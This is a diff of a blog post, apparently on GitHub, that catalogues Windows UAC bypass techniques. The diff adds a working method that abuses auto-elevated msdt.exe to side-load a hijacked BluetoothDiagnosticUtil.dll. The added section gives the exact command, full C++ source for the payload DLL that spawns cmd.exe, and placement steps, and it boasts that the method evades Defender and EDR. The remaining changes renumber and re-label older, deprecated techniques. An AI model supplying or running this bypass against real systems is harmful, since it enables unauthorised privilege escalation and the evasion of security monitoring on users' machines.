@@ -21,7 +21,7 @@ Unrelated, but I also added an updated [Discord](https://discord.gg/bqDkEdDrQQ) 
 
 > Update: 3/20/2025: I think someone at Microsoft secretly reads this blog... 😆 I say that because all the methods I posted in fall of last year are now deprecated.  The irony is that I was able to resurrect an old UAC Bypass method that still works if you tweak it a bit!  See below for more info:
 
-***UAC Bypass - Revisiting an old technique! (Detection Status: Undetected)***
+***UAC Bypass #1 - Revisiting an old technique! (Detection Status: Undetected)***
 -
 
 We're going to be revisiting a tried and true UAC Bypass method that still works just fine as of writing this post, 3/20/2025.  (Microsoft if you're reading this I'm on to you!)  I thought to myself,"Windows Defender can't be blocking all these classic UAC bypass methods."  Sure enough, their filters aren't that impressive.  We're going to be working with the `ComputerDefaults.exe` executable in the `C:\Windows\System32` directory.  Here's how it works:
@@ -108,14 +108,109 @@ Start-Process "C:\Windows\System32\ComputerDefaults.exe"
 And there you have it.  An age old UAC Bypass technique that still works, still bypasses UAC and STILL EVADES DEFENDER!  The irony is it's easier than all the other methods I posted last year.
 Think smarter not harder I guess.  Okay, I feel better about this blog post now.  I couldn't sit idly by while folks found this page and were likely immediately disappointed because none of the techniques I shared were still relevent.  Now there's at least one 😙  Until next time!
 
+***UAC Bypass #2 - Using Micrososft's Troubleshooting Tool to elevate to Admin! (Detection Status: Undetected)***
+-
+
+Credit first and foremost goes to Emeric Nasi, who discovered this quite some time ago.  All I did was repurpose it for my own needs and present it in a way that is understandable and accessible to you the reader 😸  His original article on this particular UAC bypass technique can be found here: https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass
+
+The affected executable is `c:\windows\syswow64\msdt.exe` and we will be seizing the opportunity to exploit a DLL that is vulnerable to DLL hijacking. The reason for the `syswow64` directory is because the vulnerable DLL is the x86/32 bit version, and it will ultimately be loaded by `C:\WINDOWS\SysWOW64\sdiagnhost.exe` which follows the initial loading of `msdt.exe`.  The DLL in question is: `BluetoothDiagnosticUtil.dll`
+
+In order to pull this off, all we need to do is run the following command: 
+
+`c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes`
+
+I'm not going to go into detail as to why it works.  I'd recommend reading Emeric's article to understand how he worked it out.  I can say that like most UAC bypass exploits, the msdt.exe is auto-elevated.  The auto-elevation portion depends on the .xml file though.
+
+We also need our own custom .dll to execute our cmd.exe for demo purposes.  I used the following code for mine (Be sure to set your project to compile this as x86):
+
+![image](https://github.com/user-attachments/assets/66cec1d0-c268-4302-8997-d767a2d3a4c5)
+
+```cpp
+#include "pch.h"
+#include <iostream>
+#include <windows.h>
+void executor()
+{
+
+        STARTUPINFO si = { sizeof(STARTUPINFO) };
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_SHOWNORMAL;  // Ensures the console window is visible
+
+        PROCESS_INFORMATION pi;
+
+        if (CreateProcess(
+            L"C:\\Windows\\System32\\cmd.exe", // Application path
+            NULL,                            // Command line args
+            NULL,                            // Process handle not inheritable
+            NULL,                            // Thread handle not inheritable
+            FALSE,                           // Inherit handles
+            CREATE_NEW_CONSOLE,              // Ensures a new console window
+            NULL,                            // Use parent's environment
+            NULL,                            // Use parent's starting directory
+            &si,                             // Pointer to STARTUPINFO
+            &pi)                             // Pointer to PROCESS_INFORMATION
+            )
+        {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        }
+        else
+        {
+            std::cerr << "Failed to start cmd.exe. Error: " << GetLastError() << std::endl;
+        }
+    }
+
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        executor();
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+Once we compile that, be sure to place it in a folder included in your USER ENVIRONMENT **%PATH%** variable of your choosing. I chose `c:\myfolder\BluetoothDiagnosticUtil.dll`
+
+Let's run our full command and see what happens:
+
+`c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes`
+
+![image](https://github.com/user-attachments/assets/2085b7c2-dabe-4b8b-82a9-fb466ee77f4d)
+
+First off, we get the elevated msdt.exe:
+
+![image](https://github.com/user-attachments/assets/f8dfe3ca-5099-4621-a7f4-b03aca7a4fb7)
+
+Next, we see our newly spawned cmd.exe!
+
+![image](https://github.com/user-attachments/assets/d27a4ce8-6cb4-4756-9c94-ee9a7e68764e)
+
+And the final picture 😸
+
+![image](https://github.com/user-attachments/assets/bfabeb25-a36e-4adb-aaa0-3fb0a7cfad63)
+
+GAME OVER!  not too bad huh?  also Defender never made a peep.  This bypasses EDR with a breeze.  That's it!
+
 <hr>
 
 > Everything below this line is deprecated as far as anything > Windows 11 22h2.  I'd assume OSes < Windows 11 22H2 are still game 😸
+
 <hr>
-***UAC Bypass Technique #1 - DLL Sideloading<br>(UAC setting - ALWAYS ON)***
+
+***UAC Bypass Technique #3 - DLL Sideloading<br>(UAC setting - ALWAYS ON)***
 -
 
-> ***This is now deprected as of sometime in early 2025 ***
+> ***  REMINDER: This is now deprected as far as Windows 11 >22h2 is concerned as of sometime in early 2025 ***
 
 This one isn't too challenging to pull off, though it proved difficult locating a consistent DLL in use across all Windows 11 versions (home/pro/education/enterprise). I'm talking about the ever famous scheduled task, `SilentCleanup`, which of course runs: `cleanmgr.exe / dismhost.exe`. This scheduled task has been abused time and time again over the years, and somehow it still prevails as a tried and true vector for UAC bypass / privilege escalation to this day.
 ![image](https://github.com/user-attachments/assets/59d2143f-492c-4454-a041-c450dcac815a)
@@ -197,7 +292,7 @@ OKAY!  we're in business.  **HOWEVER**, there is a caveat to this bypass and the
 
 Trust me, I tried... 😿  But until then, this particular bypass works even with UAC set to ALWAYS ON.  
 
-***UAC Bypass Technique #2 - Mock Trusted Folders<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
+***UAC Bypass Technique #4 - Mock Trusted Folders<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
 -
 
 > **UPDATE: 3/18/2025 - This no longer appears to work on the latest Windows 11 (v24H2), possibly 23H2 as well.**
@@ -289,7 +384,7 @@ and that's it!
 
 Now, time for the grand finale 🙂  I had the most fun with this one, as it's the most creative and consequently the most difficult to learn and pull off...at least for me personally.  But that's what made it all the more enjoyable to research!  I give you...
 
-***UAC Bypass Technique #3 - UI Access Token Duplication<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
+***UAC Bypass Technique #5 - UI Access Token Duplication<br>(UAC setting - Don't notify me when I make changes to Windows settings)***
 -
 
 > **UPDATE: 3/18/2025 - This seems to have been patched sometime in late Fall, 2024**
